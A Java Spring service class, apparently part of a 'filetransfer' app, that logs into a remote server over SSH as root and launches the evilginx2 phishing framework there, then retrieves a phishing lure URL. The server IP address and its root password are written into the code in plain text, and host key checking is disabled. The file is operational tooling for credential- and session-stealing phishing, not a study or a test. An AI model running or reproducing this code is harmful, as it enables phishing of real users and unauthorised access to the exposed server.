package havezzy.filetransfer.app.linux;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;

import org.springframework.stereotype.Service;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

@Service
public class Linux {
	public void accessLinux() {
		String host = "46.175.146.111";
		String username = "root";
		String password = "gFpB7.]Pb491Xc";
		String script = "cd evilginx2 && sudo ./build/evilginx -p ./phishlets -t ./redirectors && lures get-url 0";

		executeCommand(host, username, password, script);
	}

	private static void executeCommand(String host, String username, String password, String script) {
		try {
			JSch jsch = new JSch();
			Session session = jsch.getSession(username, host, 22);

			// Set password for authentication
			session.setPassword(password);

			// Disable strict host key checking
			java.util.Properties config = new java.util.Properties();
			config.put("StrictHostKeyChecking", "no");
			session.setConfig(config);

			// Establish the connection
			session.connect();

			// Create the channel
			Channel channel = session.openChannel("exec");
			((ChannelExec) channel).setCommand(script);

			// Set up input and output streams
			channel.setInputStream(null);
			((ChannelExec) channel).setErrStream(System.err);

			InputStream in = channel.getInputStream();

			// Connect and run the command
			channel.connect();

			// Read the command output
			byte[] tmp = new byte[1024];
			while (true) {
				while (in.available() > 0) {
					int i = in.read(tmp, 0, 1024);
					if (i < 0)
						break;
					System.out.print(new String(tmp, 0, i));
				}
				if (channel.isClosed()) {
					if (in.available() > 0)
						continue;
					System.out.println("Exit Status: " + channel.getExitStatus());
					break;
				}
				try {
					Thread.sleep(1000);
				} catch (Exception ignored) {
				}
			}

			// Disconnect
			channel.disconnect();
			session.disconnect();

		} catch (JSchException | IOException e) {
			e.printStackTrace();
		}
	}

}
